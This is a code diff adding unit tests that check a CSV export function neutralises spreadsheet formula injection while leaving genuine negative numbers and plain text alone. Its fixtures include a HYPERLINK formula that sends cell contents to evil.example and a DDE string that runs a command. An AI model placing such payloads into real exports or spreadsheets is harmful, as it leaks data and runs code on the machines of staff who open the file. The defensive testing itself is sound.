@@ -88,4 +88,38 @@ describe("toCsv", () => {
     ]);
     expect(csv).toBe('A,B\r\nplain,"has,comma"\r\n');
   });
+
+  describe("formula injection", () => {
+    const one = (v: string) =>
+      toCsv([{ v }], [{ header: "V", value: (r) => r.v }]).split("\r\n")[1];
+
+    it("neutralises a cell that would run as a formula", () => {
+      // An applicant's name from the public form, opened in Excel by staff.
+      expect(one('=HYPERLINK("https://evil.example/"&A1,"x")')).toBe(
+        `"'=HYPERLINK(""https://evil.example/""&A1,""x"")"`,
+      );
+      expect(one("+1+1")).toBe("'+1+1");
+      expect(one("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
+      expect(one("\tfoo")).toBe("'\tfoo");
+      expect(one("\rfoo")).toBe("'\rfoo");
+    });
+
+    it("neutralises a leading dash that isn't a number (the DDE form)", () => {
+      // Single quotes don't need CSV quoting, so the cell stays bare — the
+      // leading apostrophe is the whole defence here.
+      expect(one("-cmd|' /C calc'!A0")).toBe("'-cmd|' /C calc'!A0");
+      expect(one("-2+3")).toBe("'-2+3");
+    });
+
+    it("leaves genuine negative amounts alone so expense columns stay numeric", () => {
+      expect(one("-1234.56")).toBe("-1234.56");
+      expect(one("-5")).toBe("-5");
+    });
+
+    it("leaves ordinary text and positive numbers untouched", () => {
+      expect(one("Jane Doe")).toBe("Jane Doe");
+      expect(one("1234.56")).toBe("1234.56");
+      expect(one("Unit 2B — repair")).toBe("Unit 2B — repair");
+    });
+  });
 });
